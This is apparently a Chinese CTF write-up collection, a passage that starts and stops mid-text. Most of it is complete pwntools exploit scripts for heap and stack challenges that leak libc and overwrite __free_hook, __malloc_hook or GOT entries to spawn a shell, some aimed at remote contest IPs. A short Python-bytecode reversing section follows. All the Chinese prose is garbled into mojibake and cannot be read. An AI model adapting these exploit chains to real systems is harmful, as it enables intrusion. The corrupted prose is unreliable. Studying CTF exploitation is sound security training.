remote(\"47.111.104.99\",51006)\np.recvuntil(\"You will find this game very interesting\\n\")\nfor i in range(16):\n\tp.sendline(str(0x20))\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0000000000401213\np.send(p64(0x603500)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4007DF))\nlibc_base = u64(p.recv(6)+'\\x00\\x00') - libc.sym['puts']\ninfo(\"libc_base:\" + hex(libc_base))\np.sendline(\"a\"*0x8+p64(pop_rdi)+p64(libc_base+libc.search(\"/bin/sh\").next())+p64(libc_base+libc.sym['system']))\np.interactive()\n```\n\n\n\n# 0x02 æ¹–æ¹˜æ¯2020 blend_pwn\n\næˆ‘æ„¿ç§°ä¹‹ä¸ºâ€œä¸€ä¸ªå­—èŠ‚çš„èƒœåˆ©â€ï¼Œä»¥åä¸€å®šè¦æ…ç”¨sendlineå‡½æ•°ï¼\n\né¢˜ç›®å¾ˆå¤šæ¼æ´ï¼Œè¦ç»¼åˆä½¿ç”¨ï¼Œå…¶ä¸­ä¸»è¦è€ƒç‚¹æ˜¯C++å¼‚å¸¸å¤„ç†ï¼Œå‚è€ƒæ–‡ç« [pwn DCTF2017 Flex](https://firmianay.github.io/pwn_dctf2017_flex/)\n\nåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libcåŸºåœ°å€ï¼Œdelå‡½æ•°ä¸­æ²¡æœ‰å¯¹chunkä¸­çš„å†…å®¹è¿›è¡Œæ¸…é›¶ï¼Œç„¶ååˆ©ç”¨showåŠŸèƒ½æ³„éœ²å‡ºå †åœ°å€ï¼Œå†åˆ©ç”¨ partial write å®ç°æ ˆè¿ç§»åˆ°æˆ‘ä»¬å·²ç»å¸ƒç½®å¥½onegadgetçš„å †ä¸Šåå®ç°getshellã€‚\n\n## exp\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\nsh=process(\"./blend_pwn\")\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#sh=remote('47.111.104.169',57704)\nog = [0x45226 ,0x4527a,0xf0364,0xf1207]\ndef name(name):\n    sh.recvuntil(\"name:\")\n    sh.send(name)\n\ndef showname():\n    sh.recvuntil('choice >')\n    sh.sendline(str(1))\n\ndef add(content):\n\tsh.recvuntil('choice >')\n\tsh.sendline(str(2))\n\tsh.sendline(content)\n\ndef show():\n\tsh.recvuntil(\"choice >\")\n\tsh.sendline(str(4))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice >\")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"index>\")\n\tsh.sendline(str(idx))\n\ndef gift(con):\n    sh.recvuntil(\"choice >\")\n    sh.sendline(str(666))\n    sh.recvuntil(\"Please input what you want:\")\n    #gdb.attach(sh,\"b *$rebase(0x11E9)\")\n    sh.send(con)\n\nname(\"%11$p\")\nshowname()\nsh.recvuntil(\"Current user:\")\nlibc_base = int(sh.recvline(),16) - libc.sym['__libc_start_main'] -240\n# read1 = libc_base + libc.sym['read']\ninfo(hex(libc_base))\nonegadget = libc_base + og[1]\ninfo(hex(onegadget))\n# sys = libc_base + libc.sym['system']\nadd(p64(onegadget)*0xc)\nadd(p64(onegadget)*0xc)\ndelete(0)\ndelete(1)\nshow()\nsh.recvuntil('index 2:')\nheap_addr = u64(sh.recvuntil('\\n',drop = True).ljust(8,'\\x00')) + 0x28\ninfo(hex(heap_addr))\npayload = 'a'*0x20 + p64(heap_addr)\ngift(payload)\n\nsh.interactive()\n```\n\n\n\n# 0x03 æ¹–æ¹˜æ¯2020 babyheap\n\nè¾›è‹¦**pwnht**å­¦é•¿äº†ã€‚ã€‚ã€‚ä¼¼ä¹å…³é”®æ¼æ´ä¸æ˜¯å•å­—èŠ‚å†™0ï¼Œæ˜¯æˆ‘èœäº†ï¼Œï¼Œï¼Œ\n\nä¸è¿‡å­¦åˆ°äº†åŠ è½½libcçš„æ–°æ–¹æ³•ï¼Œ`env ={\"LD_PRELOAD\":\"./libc.so.6\"}`ï¼Œ\n\næ¼æ´ç‚¹åœ¨äºshow å’Œ deleteçš„idxæ²¡æœ‰æ£€æŸ¥è¾¹ç•Œï¼Œï¼Œé¦–å…ˆç”¨`show(-7)`leakå‡ºpieåœ°å€ã€‚\n\næ¥ç€å¡«æ»¡tcacheï¼Œleakå‡ºlibcåœ°å€å’Œå †åœ°å€ã€‚\n\nç„¶ååœ¨å †ä¸Šä¼ªé€ å‡ºsizeä¸º0x100çš„å †å—ï¼Œå¹¶ç”¨delå‡½æ•°è¿›è¡Œfreeï¼Œç„¶ååŠ«æŒå…¶fdæŒ‡é’ˆä¿®æ”¹ä¸º`__free_hook`ï¼Œå¹¶æ”¹ä¸ºsystemå‡½æ•°åœ°å€ï¼Œæ‰§è¡Œ/bin/shå³å¯ã€‚\n\n## exp\n\n```python\nfrom pwn import *\np = process(\"./babyheap\",env ={\"LD_PRELOAD\":\"./libc.so.6\"}) #load target libc\nlibc = ELF(\"./libc.so.6\")\ndef add():\n\tp.recvuntil(\">>\")\n\tp.sendline(\"1\")\ndef show(idx):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\ndef edit(idx,size,data):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Content:\")\n\tp.send(data)\ndef free(idx):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\nshow(-7)\np.recvline()\npie = u64(p.recv(6)+'\\x00\\x00')-0x202008 #leak_pie\nprint hex(pie)\nfor i in range(8):\n\tadd()\nfor i in range(8):\n\tfree(7-i)\nfor i in range(8):\n\tadd()\nedit(7,0x20,'a'*8)\nshow(7)\np.recvuntil(\"a\"*8)\nlibc.address = u64(p.recv(6)+'\\x00\\x00')-0x3EBCA0 #leak_libc\nprint hex(libc.address)\nshow(0)\np.recvline()\nheap = u64(p.recv(6)+'\\x00\\x00')\nprint hex(heap)\nedit(0,0x88,p64(heap-0xD0)*5+p64(0x101))\nedit(1,0x88,p64(0)*5+p64(0x101))\nfree(( heap - 0xe0 - (pie+0x202040) )/8) #offset\nedit(0,0x88,p64(heap-0xD0)*5+p64(0x101)+p64(libc.sym['__free_hook']))\n#gdb.attach(p,'b *$rebase(0x202040)')\nadd()\nadd()\nedit(9,9,p64(libc.sym['system']))\nedit(2,8,'/bin/sh\\x00')\nfree(2)\np.interactive()\n```\n\n\n\n# 0x04 ä¸Šæµ·èµ› lgtwo\n\n> æ¯”èµ›4é“pwné¢˜å’ŒA1GXå¸ˆå‚…å†²äº†3é“ï¼Œæœ‰ä¸€é“ä¹‹å‰å†™è¿‡ç±»ä¼¼çš„å°±ä¸å†™é¢˜è§£äº†\n>\n\nè¿™é¢˜ä¸€å¼€å§‹æ€è·¯å°±é”™äº†ï¼Œè€½è¯¯äº†å¾ˆé•¿æ—¶é—´ï¼Œ\n\n**éš¾ç‚¹ï¼š** åˆ©ç”¨off by one å°†1æ”¹æˆä¸‰ä¸ªchunkå¤§å°ï¼Œfree 2 è¿›å…¥fastbinï¼Œfree 1 æ”¾å…¥unsortedbinï¼Œç„¶ååˆ†å‰²unsortedbinï¼Œå°†main_arenaæ”¾å…¥fastbin\n\n**æ€è·¯ï¼š** åˆ©ç”¨off by oneæ„é€ overlapï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ‰€ä»¥é€šè¿‡çˆ†ç ´stdoutæ³„éœ²libcåŸºå€ï¼Œç„¶åé€šè¿‡unlinkä¿®æ”¹free_hookä¸ºonegadgetä»è€Œgetshell\n\n## exp\n\n```python\nfrom pwn import *\n# context.log_level = 'debug'\ncontext.binary = './lgtwo'\n# p = process('./pwn')\nelf = ELF('./lgtwo')\nlibc = elf.libc\ndef add(size,payload):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('?',str(size))\n\tp.sendafter('?',payload)\ndef delete(idx):\n\tp.sendlineafter('>> ','2')\n\tp.sendlineafter('?',str(idx))\n\ndef show(idx):\n\tp.sendlineafter('>> ','3')\n\tp.sendlineafter('?',str(idx))\n\ndef change(idx,payload):\n\tp.sendlineafter('>> ','4')\n\tp.sendlineafter('?',str(idx))\n\tp.sendafter('?',payload)\nbuf = 0x6020C0\nstdout = 0x602020\n\nwhile(1):\n\t#p = remote('123.56.52.128','45830')\n\tp = process('./lgtwo')\n\tadd(0x18,'aaa') #0\n\tadd(0x18,'bbb') #1\n\tadd(0x60,'ccc') #2\n\tadd(0x30,'aaa') #3\n\tadd(0x10,'ddd') #4\n\tchange(0,'a'*0x10+p64(0)+p8(0xd1))\n\tdelete(2) \n\tdelete(1)\n\tadd(0x18,'aaa') #1\n\tadd(0xa0,'ccc') #2\n\tchange(1,'a'*0x10+p64(0)+'\\x70')\n\tchange(2,'\\xdd'+'\\x15')  \n    \n\tadd(0x60,'aaa') #5\n\ttry:\n\t\tadd(0x68,'bbb') #6\n\texcept EOFError:\n\t\tprint 'error!!!'\n\t\tp.close()\n\t\tcontinue\n\tchange(6,'\\x00'*0x33 +p64(0xfbad18a0)+p64(0)*3+p8(0) )\n\tlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3c5600\n\tone = [0x45226,0x4527a,0xf0364,0xf1207]\n\tone_gadget = libc_base+one[1]\n\tfree_hook = libc_base+libc.sym['__free_hook']\n\tinfo(hex(libc_base))\n\t# gdb.attach(p)\n\t# pause()\n\tadd(0x48, \"ddaa\") #7\n\tadd(0x80,'ddaa') #8\n\tadd(0x10,'aaaa' ) #9\n\tpayload = p64(0)+p64(0x41)\n\tpayload += p64(buf +7*8- 0x18)  #fd\n\tpayload += p64(buf +7*8- 0x10)  #bk\n\tpayload += 'a'*0x20\n\tpayload += p64(0x40)+p8(0x90) \n\tchange(7,payload)\n\tdelete(8)\n\tchange(7,p64(0)*3+p64(free_hook))\n\tchange(7,p64(one_gadget))\n\tdelete(9)\n\tp.interactive()\n```\n\n\n\n# 0x05 ä¸Šæµ·èµ› maj0rone\n\nç»™äº†å¤§é‡æ··æ·†åƒè¿™æ ·ï¼ŒçœŸå“äººï¼Œè·ç¦»æ¯”èµ›ç»“æŸè¿˜æœ‰ä¸¤ä¸ªå°æ—¶æœ¬ä¸æƒ³åšäº†çš„\n\n![image-20201116001757421](https://i.loli.net/2020/11/16/WJOMZH34pFB1Knh.png)\n\nä½†æ˜¯A1GXå¸ˆå‚…è¯´ä¸è¦çœ‹è¿™äº›æ··æ·†å¹¶çˆ†ç ´å‡ºè¿™ä¸ª\n\n```python\nfor a1 in range(512):\n    v1 = 512\n    if ( a1 <= 512 ):\n        v1 = a1\n    if ( v1 <= 300 ):\n        v2 = a1\n    else:\n        v2 = 300\n    if ( v2 >= 150 ):\n        v3 = 150\n    else:\n        v3 = a1\n    if ( v3 <= 80 ):\n        v4 = 80\n    else:\n        v4 = a1\n    v7 = v4\n    if ( v4 <= 80 ):\n        v4 = 80\n    if ( v4 >= 83 ):\n        v5 = 80\n    else:\n        v5 = v7\n    if(a1==v5):\n        print(a1)\n# 80 81 82\n```\n\nè¿™æ ·å°±å¯ä»¥è¿›å…¥å‡½æ•°äº†ï¼Œå…¶å®å°±æ˜¯ä¸€é“å¸¸è§„å †é¢˜ï¼Œç»™äº†æˆ‘å¾ˆå¤§ä¿¡å¿ƒ/æ»‘ç¨½\n\n**éš¾ç‚¹ï¼š**å°†0æ”¾å…¥unsortedbinï¼Œç„¶ååˆ†å‰²æˆ2ï¼Œ3ï¼Œå°†3æ”¾å…¥fastbinï¼Œæ”¹3çš„sizeä¸º0x91ï¼Œä¸ºäº†é¿å…doublefreeï¼Œæ‰€ä»¥å…ˆfreeä¸€æ¬¡4ï¼Œç„¶åå†free 3 ï¼Œè¿™æ ·ä¹‹åï¼Œ3æ—¢åœ¨fastbinåˆåœ¨unsortedbinï¼Œå†å°†3sizeæ”¹å›0x71ï¼Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯ä¸ºäº†è®©main_arenaæ”¾å…¥fastbinä¸­ï¼Œæ‰€ä»¥åªæœ‰ä¸€æ¡fastbiné“¾åï¼Œå°±å¯ä»¥çˆ†ç ´stdoutäº†\n\n**æ€è·¯ï¼š**åˆ©ç”¨uafæ¼æ´ï¼Œåˆ†å‰²unsortedbinï¼Œé€šè¿‡æ„é€ è·å¾—fastbinï¼Œç”±äºæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œæ‰€ä»¥çˆ†ç ´stdoutæ³„éœ²libcåŸºå€ï¼Œæœ€ååˆ©ç”¨fastbin attackå°†fdæ”¹ä¸ºmalloc_hook-0x23ï¼Œä»è€Œå°†malloc_hookæ”¹ä¸ºonegadget getshell\n\n## exp\n\n```python\nfrom pwn import *\n# context.log_level = 'debug'\ncontext.binary = './maj0rone'\n# p = process('./pwn')\nelf = ELF('./maj0rone')\nlibc = elf.libc\ndef add(size,payload):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('n',str(80))\n\tp.sendlineafter('?',str(size))\n\tp.sendafter('?',payload)\n\ndef delete(idx):\n\tp.sendlineafter('>> ','2')\n\tp.sendlineafter('?',str(idx))\n\ndef show(idx):\n\tp.sendlineafter('>> ','3')\n\tp.sendlineafter('?',str(idx))\n\ndef change(idx,payload):\n\tp.sendlineafter('>> ','4')\n\tp.sendlineafter('?',str(idx))\n\tp.sendafter('?',payload)\nwhile(1):\n\t#p = process('./maj0rone')\n\tp = remote('123.56.52.128','18523')\n\tadd(0x90,'aaaa') #0\n\tadd(0x10,'aaaa') #1\n\tdelete(0)\n\tadd(0x20,'aaaa') #2\n\tadd(0x60,'aaaa') #3\n\tadd(0x60,'bbbb') #4\n\tdelete(3)\n\tpayload = 'a'*0x20+p64(0)+p64(0x91)\n\tchange(0,payload)\n\tdelete(4)\n\tdelete(3)\n\tchange(3,'\\xdd'+'\\x15')\n\tpayload = 'a'*0x20+p64(0)+p64(0x71)\n\tchange(0,payload)\n\ttry:\n\t\tadd(0x60,'aaaa')\n\t\tadd(0x60,'aaaa')\n\t\tadd(0x60,'aaaa') #7\n\texcept EOFError:\n\t\tprint 'error!!!'\n\t\tp.close()\n\t\tcontinue\n\tchange(7,'\\x00'*0x33 +p64(0xfbad1800)+p64(0)*3+p8(0))\n\tlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3c5600\n\tmalloc_hook = libc_base+libc.sym['__malloc_hook']\n\tone = [0x45226,0x4527a,0xf0364,0xf1207]\n\tone_gadget = libc_base+one[3]\n\tinfo(hex(one_gadget))\n\tinfo(hex(libc_base))\n\tadd(0x60,'aaaa') #8\n\tdelete(8)\n\tchange(8,p64(malloc_hook-0x23))\n\tadd(0x60,'aaaa') #9\n\tadd(0x60,'aaaa') #10\n\tpayload = '\\x00'*0x13+p64(one_gadget)\n\tchange(10,payload)\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('n',str(80))\n\tp.sendline(str(0x10))\n\t# gdb.attach(p)\n\t# pause()\n\tp.interactive()\n```\n\n\n\n# 0x06 ä¸Šæµ·èµ› cpu_emulator\n\nåšvmpwnçœŸçš„éš¾ï¼Œéœ€è¦ä¸€å®šçš„é€†å‘åŸºç¡€\n\n![image-20201129233652763](https://i.loli.net/2020/11/29/9wXqSIW2m1DHgsv.png)\n\nåˆ†æå‡ºä¸»è¦é€»è¾‘ï¼Œæ¨¡æ‹Ÿäº†cpuçš„å·¥ä½œï¼Œ32ä¸ªå¯„å­˜å™¨ï¼Œæ¯ä¸ªå¯„å­˜å™¨32ä½ï¼ŒæŒ‡ä»¤é•¿åº¦ä¹Ÿæ˜¯32ä½ï¼ŒæŒ‡ä»¤æ˜¯åˆ†æ®µçš„ï¼Œä¸”æœ‰ä¸¤ç§è§£ææ–¹å¼ï¼Œæ¼æ´åœ¨ç¬¬ä¸€ç§è§£ææ–¹å¼\n\n![image-20201129234316625](https://i.loli.net/2020/11/29/ahn1dIQR8m7SbxO.png)\n\næ‰¾åˆ°æº¢å‡ºç‚¹ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨tcacheæ”¹fdæŒ‡é’ˆï¼Œå°†free_gotå’Œatoi_got æ”¹æˆprintfå‡½æ•°ï¼Œæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²libcåŸºå€ï¼Œç„¶åå†æ”¹atoi_gotä¸ºsystemå³å¯\n\n## exp\n\n```python\nfrom pwn import*\n# context.log_level = 'debug'\np = process('./emulator')\nelf = ELF('./emulator')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nogg = [0x4f365,0x4f3c2,0x10a45c]\nfree_got = elf.got['free'] #0x602018\natoi_got = elf.got['atoi'] #0x602058\nprintf_plt = elf.plt['printf']\nexit_got = elf.got['exit'] #0x602060\n\ndef show(a,addr):\n\tinfo(a+':'+hex(addr))\n\ndef setInstruction(size,content):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('size:\\n',str(size))\n\tp.sendafter('instruction:\\n',content)\n\ndef last_set(size,content):\n\tp.sendafter('>> ','1')\n\tp.sendlineafter('size:\\n','%'+str(size)+'c')\n\tp.sendafter('instruction:\\n',content)\n\ndef getOrder1(a1,a2,a3,a4):\n\tresult = (a1<<26) + (a2<<21) + (a3<<16) + a4 \n\treturn p32(result)\n\ndef run():\n\tp.sendlineafter('>> ','2')\n\nsetInstruction(0x100,'\\x00')\nsetInstruction(0x20,'\\x00')\nsetInstruction(0x30,'\\x00')\nsetInstruction(0x40,'\\x00')\npayload1 = getOrder1(8,0,0,0xf1) + getOrder1(8,0,0,0xe0) + getOrder1(8,1,1,0x8+1) + getOrder1(0x2b,1,0,0xffff)+getOrder1(1,0,0,0)\nsetInstruction(0x100,payload1)\nrun()\npayload2 = '\\x00'*0x100\npayload2 += p64(0)+p64(0xa1)+p64(free_got-8).ljust(0x20,'\\x00') #ä½8ä½å› ä¸ºfdä¼šè¢«æ¸…0\npayload2 += p64(0)+p64(0xb1)+p64(atoi_got).ljust(0x30,'\\x00')\npayload2 += p64(0)+p64(0xc1)+p64(atoi_got).ljust(0x40,'\\x00')\nsetInstruction(0x1c0,payload2)\n# run()\nsetInstruction(0x20,'\\x00')\nsetInstruction(0x30,'\\x00')\nsetInstruction(0x40,'\\x00')\nsetInstruction(0x20,p64(printf_plt)*2)\nsetInstruction(0x30,p64(printf_plt))\np.sendlineafter('>> ','%15$p')\nleak = int(p.recvuntil('\\n'),16) - 231\nlibcbase = leak - libc.sym['__libc_start_main']\none = libcbase + ogg[2]\nsystem_addr = libcbase + libc.sym['system']\nshow('libcbase',libcbase)\nshow('one_gadget',one)\nshow('system_addr',system_addr)\n\n# last_set(0x40,p64(system_addr))\nlast_set(0x40,p64(one))\n# p.sendlineafter('>> ','/bin/sh')\n\np.interactive() \n```\n\n\n\n# 0x07 cumtæ–°ç”Ÿèµ› pwn5\n\nchangeå‡½æ•°å­˜åœ¨æº¢å‡ºï¼Œæ²¡æœ‰å¼€PIEï¼Œç•™äº†åé—¨ï¼Œå†™ä¸¤ç§è§£æ³•\n\n## exp\n\nè§£æ³•ä¸€ï¼Œå¯ä»¥ç”¨house of forceæ¥ä¿®æ”¹Byeå‡½æ•°æŒ‡é’ˆä¸ºbackdo0r\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n# r = remote('219.219.61.234','10014')\nr = process('./pwn5')\ndef add(size,con):\n\tp.sendlineafter('Your choice:','2')\n\tp.sendlineafter('Plz input the size of item name:',str(size))\n\tp.sendafter('Plz input the name:',con)\ndef delete(idx):\n\tp.sendlineafter('Your choice:','4')\n\tp.sendlineafter('Plz enter the index of item:',str(idx))\ndef show():\n\tp.sendlineafter('Your choice:','1')\ndef change(idx,size,con):\n    p.sendlineafter('Your choice:','3')\n    p.sendlineafter('Plz enter the index of item:',str(idx))\n    p.sendlineafter('Plz enter the length of item name:',str(size))\n    p.sendafter('Plz enter the new name of the item:',con)\n\nsys = 0x400D1B\nadd(0x30, \"ld1ng\")\npayload = 0x30 * 'a'\npayload += p64(0) + p64(0xffffffffffffffff)\nchange(0, 0x50, payload)\noffset = -0x60\nmalloc_size = offset -0x10\nadd(malloc_size, \"ld1ng\")\n# gdb.attach(r)\nadd(0x10, p64(sys) * 2)\nr.recvuntil(\":\")\nr.sendline(\"5\")\nr.interactive()\n```\n\nè§£æ³•äºŒï¼Œunlinkæ”¹ freeçš„gotè¡¨\n\n```python\n#!/usr/bin/python\n#coding=utf-8\nfrom pwn import *\n#context.log_level = 'debug'\np = process('./pwn5')\n#p = remote('219.219.61.234','10014')\nelf = ELF('./pwn5')\n\nlibc = elf.libc\ndef add(size,con):\n\tp.sendlineafter('Your choice:','2')\n\tp.sendlineafter('Plz input the size of item name:',str(size))\n\tp.sendafter('Plz input the name:',con)\n\ndef delete(idx):\n\tp.sendlineafter('Your choice:','4')\n\tp.sendlineafter('Plz enter the index of item:',str(idx))\n\ndef show():\n\tp.sendlineafter('Your choice:','1')\n\ndef change(idx,size,con):\n    p.sendlineafter('Your choice:','3')\n    p.sendlineafter('Plz enter the index of item:',str(idx))\n    p.sendlineafter('Plz enter the length of item name:',str(size))\n    p.sendafter('Plz enter the new name of the item:',con)\nbuf = 0x06020b8\nsys = 0x400D1B\nadd(0x60,'ccc')\nadd(0x58,'aaa')\nadd(0x80,'bbb')\nadd(0x60,'eee')\nadd(0x60,'fff')\npayload = p64(0)+p64(0x51)\npayload += p64(buf - 0x18) \npayload += p64(buf - 0x10)\npayload += 'a'*0x30\npayload += p64(0x50)+p8(0x90) \nchange(1,0x80,payload)\ndelete(2)\nchange(1,0x40,p64(0x60)*3+ p64(0x6020a8))\nchange(1,0x40,p64(elf.got['free']))\nchange(0,0x40,p64(sys)*2)\n# delete(3)\n# gdb.attach(p)\np.interactive()\n```\n\n# 0x08 è®°äº‹æœ¬é€†å‘\n\n![image-20201128225011389](https://i.loli.net/2020/11/28/dIxOgr3muflb8TA.png)\n\næœ‰ä¸€è¯´ä¸€ç‚œå“¥å†™æ–‡æ¡ˆçš„æ°´å¹³å¤ªå¼ºäº†\n\n```python\nDisassembly of __init__:\n 47           0 LOAD_CONST               0 (None)\n              2 LOAD_FAST                0 (self)\n              4 STORE_ATTR               0 (left)\n\n 48           6 LOAD_CONST               0 (None)\n              8 LOAD_FAST                0 (self)\n             10 STORE_ATTR               1 (right)\n\n 49          12 LOAD_FAST                1 (data)\n             14 LOAD_FAST                0 (self)\n             16 STORE_ATTR               2 (data)\n             18 LOAD_CONST               0 (None)\n             20 RETURN_VALUE\n\nDisassembly of inorderTraversal:  //å·¦ä¸­å³\n 59           0 BUILD_LIST               0\n              2 STORE_FAST               2 (res)\n\n 60           4 LOAD_FAST                1 (root)\n              6 POP_JUMP_IF_FALSE       48\n\n 61           8 LOAD_FAST                0 (self)   //res = self.inorderTraversal(root.left)\n             10 LOAD_ATTR                0 (inorderTraversal)\n             12 LOAD_FAST                1 (root)\n             14 LOAD_ATTR                1 (left)\n             16 CALL_FUNCTION            1\n             18 STORE_FAST               2 (res)\n\n 62          20 LOAD_FAST                2 (res)   //res.append(root.data)\n             22 LOAD_ATTR                2 (append)\n             24 LOAD_FAST                1 (root)\n             26 LOAD_ATTR                3 (data)\n             28 CALL_FUNCTION            1\n             30 POP_TOP\n\n 63          32 LOAD_FAST                2 (res)   //res += self.inorderTraversal(root.right)\n             34 LOAD_FAST                0 (self)\n             36 LOAD_ATTR                0 (inorderTraversal)\n             38 LOAD_FAST                1 (root)\n             40 LOAD_ATTR                4 (right)\n             42 CALL_FUNCTION            1\n             44 BINARY_ADD\n             46 STORE_FAST               2 (res)\n\n 64     >>   48 LOAD_FAST                2 (res)\n             50 RETURN_VALUE\n\nDisassembly of insert:  //å·¦å³å·¦\n 51           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (data)\n              4 POP_JUMP_IF_FALSE       62\n\n 52           6 LOAD_FAST                0 (self) //if self.left is None\n              8 LOAD_ATTR                1 (left)\n             10 LOAD_CONST               0 (None)\n             12 COMPARE_OP               8 (is)\n             14 POP_JUMP_IF_FALSE       28\n\n 53          16 LOAD_GLOBAL              2 (Node)\n             18 LOAD_FAST                1 (data)\n             20 CALL_FUNCTION            1\n             22 LOAD_FAST                0 (self)\n             24 STORE_ATTR               1 (left) //self.left = Node(data)\n             26 JUMP_FORWARD            34 (to 62)\n\n 54     >>   28 LOAD_FAST                0 (self)\n             30 LOAD_ATTR                3 (right)\n             32 LOAD_CONST               0 (None)\n             34 COMPARE_OP               8 (is) \n             36 POP_JUMP_IF_FALSE       50\n\n 55          38 LOAD_GLOBAL              2 (Node) //self.right = Node(data)\n             40 LOAD_FAST                1 (data)\n             42 CALL_FUNCTION            1\n             44 LOAD_FAST                0 (self)\n             46 STORE_ATTR               3 (right)\n             48 JUMP_FORWARD            12 (to 62)\n\n 57     >>   50 LOAD_FAST                0 (self)  //self.left.insert(data)\n             52 LOAD_ATTR                1 (left)\n             54 LOAD_ATTR                4 (insert)\n             56 LOAD_FAST                1 (data)\n             58 CALL_FUNCTION            1\n             60 POP_TOP\n        >>   62 LOAD_CONST               0 (None)\n             64 RETURN_VALUE\n\nNone\n  2           0 LOAD_BUILD_CLASS\n              2 LOAD_CLOSURE             0 (Node)\n              4 BUILD_TUPLE              1\n              6 LOAD_CONST               1 (<code object Node at 0x0382DB20, line 2>)\n              8 LOAD_CONST               2 ('Node')\n             10 MAKE_FUNCTION            8\n             12 LOAD_CONST               2 ('Node')\n             14 CALL_FUNCTION            2\n             16 STORE_DEREF              0 (Node)\n\n 28          18 LOAD_GLOBAL              0 (input)\n             20 LOAD_CONST               3 ('PLZ input flag:')  //str1 = input('PLZ input flag:')\n             22 CALL_FUNCTION            1\n             24 STORE_FAST               0 (str1)\n\n 30          26 LOAD_CONST               4 (<code object <listcomp> at 0x0382DB78,  line 30>)\n             28 LOAD_CONST               5 ('main1.<locals>.<listcomp>')\n             30 MAKE_FUNCTION            0\n             32 LOAD_FAST                0 (str1)\n             34 GET_ITER\n             36 CALL_FUNCTION            1\n             38 STORE_FAST               1 (flag)\n\n 31          40 LOAD_DEREF               0 (Node)  //  root = Node(flag[0])\n             42 LOAD_FAST                1 (flag)\n             44 LOAD_CONST               6 (0)\n             46 BINARY_SUBSCR\n             48 CALL_FUNCTION            1\n             50 STORE_FAST               2 (root)\n\n 32          52 SETUP_LOOP              36 (to 90)\n             54 LOAD_GLOBAL              1 (range)  //for i in range(1,len(flag)):\n             56 LOAD_CONST               7 (1)\n             58 LOAD_GLOBAL              2 (len)\n             60 LOAD_FAST                1 (flag)\n             62 CALL_FUNCTION            1\n             64 CALL_FUNCTION            2\n             66 GET_ITER\n        >>   68 FOR_ITER                18 (to 88)\n             70 STORE_FAST               3 (i)\n\n 33          72 LOAD_FAST                2 (root)\n             74 LOAD_ATTR                3 (insert)  // root.insert(flag[i]) \n             76 LOAD_FAST                1 (flag)\n             78 LOAD_FAST                3 (i)\n             80 BINARY_SUBSCR\n             82 CALL_FUNCTION            1\n             84 POP_TOP\n             86 JUMP_ABSOLUTE           68\n        >>   88 POP_BLOCK\n\n 34     >>   90 LOAD_FAST                2 (root)\n             92 LOAD_ATTR                4 (inorderTraversal) // F = root.inorderTraversal(root)\n             94 LOAD_FAST                2 (root)\n             96 CALL_FUNCTION            1\n             98 STORE_FAST               4 (F)\n\n 35         100 LOAD_CONST               8 ('7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm')\n            102 STORE_FAST               1 (flag)  //flag = '7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm'\n\n 36         104 LOAD_CONST               7 (1)\n            106 STORE_FAST               5 (YES)\n\n 37         108 SETUP_LOOP              50 (to 160)\n            110 LOAD_GLOBAL              5 (enumerate) //è¿­ä»£å™¨ï¼Œè¿›è¡Œæ¯”è¾ƒ\n            112 LOAD_FAST                4 (F)\n            114 CALL_FUNCTION            1\n            116 GET_ITER\n        >>  118 FOR_ITER                38 (to 158)\n            120 UNPACK_SEQUENCE          2\n            122 STORE_FAST               3 (i)\n            124 STORE_FAST               6 (element)\n\n 38         126 LOAD_GLOBAL              6 (ord)\n            128 LOAD_FAST                1 (flag)\n            130 LOAD_FAST                3 (i)\n            132 BINARY_SUBSCR\n            134 CALL_FUNCTION            1\n            136 LOAD_FAST                6 (element)\n            138 COMPARE_OP               3 (!=)\n            140 POP_JUMP_IF_FALSE      118\n\n 39         142 LOAD_CONST               6 (0)\n            144 STORE_FAST               5 (YES)\n\n 40         146 LOAD_GLOBAL              7 (print)\n            148 LOAD_CONST               9 ('wrong')\n            150 CALL_FUNCTION            1\n            152 POP_TOP\n\n 41         154 BREAK_LOOP\n            156 JUMP_ABSOLUTE          118\n        >>  158 POP_BLOCK\n\n 42     >>  160 LOAD_FAST                5 (YES)\n            162 POP_JUMP_IF_FALSE      172\n\n 43         164 LOAD_GLOBAL              7 (print)\n            166 LOAD_CONST              10 ('wow~you are right!')\n            168 CALL_FUNCTION            1\n            170 POP_TOP\n        >>  172 LOAD_CONST               0 (None)\n            174 RETURN_VALUE\nNone\n```\n\npythonå­—èŠ‚ç ï¼Œåšäº†ç‚¹æ³¨é‡Šï¼Œ\n\nåˆ†æå‡ºæ˜¯ä¸€é¢—å‚å¤©å¤§æ 